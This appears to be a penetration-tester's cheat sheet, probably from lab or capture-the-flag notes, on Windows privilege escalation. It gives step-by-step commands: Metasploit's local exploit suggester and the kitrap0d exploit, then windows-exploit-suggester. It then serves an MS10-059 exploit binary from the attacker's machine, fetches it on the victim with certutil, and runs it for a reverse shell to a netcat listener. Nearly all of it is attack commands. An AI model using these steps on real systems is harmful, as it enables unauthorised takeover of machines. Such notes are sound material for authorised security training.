
### Escalation with Metasploit
```sh
meterpreter>>
>> run post/multi/recon/local_exploit_suggester
# The exploit suggester will list all the vulnerabilities which can be exploited to the system.
>> background
# Use one of the listed exploits and try to exploit as following for sample.
# We got shell using metasploit multi handler listener so we will be in that module
# msf5 exploit(multi/handler)>
> use (suggested exploit: exploit/windows/local/ms10_015_kitrap0d>
> options
> set session <backgrounded session number: session 9>
> set lhost <tun0>
> set lport <5555>
> run
# exploit successfull and new session will be opened
meterpreter>>
>> getuid
>> shell
>>> whoami

# we are now root, Ta Da !!
```


## Manual Exploitation using Windows Exploit Suggester
```sh

meterpreter>>
>> shell
>> systeminfo
# Copy the systeminfo of victim mahine and save it in a text file to feed it to exploit suggester later.


# Clone the repository from github to local machine<attacker machine>

# Update the tool
> ./windows-exploit-suggester.py --update
# After update, current database (dbname-mssb.xls) will be printed out in the output. will have to use later.

# upgrade the xlrd
> pip install xlrd --upgrade

>./windows_exploit_suggester.py --database <current db-mssb.xls> --systeminfo <sysinfofile.txt>

# Exploit suggester will list all the exploits available for the victim machine.

# Search for the exploits in google or secwiki one by one. And exploit as it says.

# Example

# The sample machine was vulnerable for MS10-059. Exploit it as follows.

# In Attacker Machine
# Search and Download the exploit from secwiki github
# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

# Start a python server in the exploit file folder om a new tab.
> python2 -m SimpleHTTPServer 80
# Server started in attacker box

# In Victim Machine. 
# Get the exploit file we shared using certutil.exe 
> certutil.exe -urlcache -f <server url: http://10.10.14.5/MS10-059.exe <newname: ms.exe>>
# Exploit file downloaded successfully
# Check file using dir
> dir

# Exploit the system using downloaded exploit file in victim machine after opening a listener in attacker machine.
> ms.exe <AttackerMachineIPAddress PORT: <10.10.14.5 5555>>

# In Attacker Machine
# Start a netcat listener in new tab
> nc  -nvlp 5555

# Execute the exploit in victim machine to get shell.

# A shell will be opened in the netcat listener.

# Ta Da !!
```
Reference:
https://github.com/SecWiki/windows-kernel-exploits